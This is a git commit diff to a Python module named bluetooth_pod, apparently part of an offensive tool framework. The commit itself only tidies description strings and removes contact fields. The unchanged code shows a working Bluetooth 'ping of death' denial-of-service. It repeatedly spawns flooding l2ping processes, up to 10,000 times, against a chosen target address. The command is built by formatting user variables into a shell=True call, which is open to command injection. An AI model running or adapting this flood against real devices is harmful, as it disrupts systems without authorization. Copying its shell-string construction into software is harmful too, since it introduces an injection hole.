118930c279f159b2650988f82ade1157d5c59010
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-10-06 18:16:22 +0300

    Update bluetooth_pod.py

--- modules/bluetooth_pod.py
+++ modules/bluetooth_pod.py
@@ -8,10 +8,8 @@ import time
 conf = {
 	"name": "bluetooth_pod",
 	"version": "1.0",
-	"shortdesc": "bluetooth ping of death",
-	"github": "entynetproject",
+	"shortdesc": "Bluetooth ping of death.",
 	"author": "entynetproject",
-	"email": "entynetproject0@gmail.com",
 	"initdate": "24.2.2016",
 	"lastmod": "29.12.2016",
 	"apisupport": False,
@@ -23,28 +21,28 @@ conf = {
 
 # List of variables
 variables = OrderedDict((
-	('interface', ['hci0', 'interface']),
-	('bdaddr', ['none', 'target bluetooth address']),
-	('size', ['600', 'size of packets (default 600)']),
+	('interface', ['hci0', 'Interface']),
+	('bdaddr', ['none', 'Target bluetooth address.']),
+	('size', ['600', 'Size of packets (default 600).']),
 ))
 
 # Custom commands
 customcommands = {
-	'scan': 'scan for devices'
+	'scan': 'Scan for devices.'
 }
 
 # Simple changelog
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	printInfo("bluetooth ping of death attack started...")
+	printInfo("Bluetooth ping of death attack started...")
 	try:
 		for i in range(1, 10000):
 			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
 			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 			time.sleep(3)
 	except(OSError):
-		printError("something went wrong!")
+		printError("Something went wrong!")
 
 
 def scan(args):
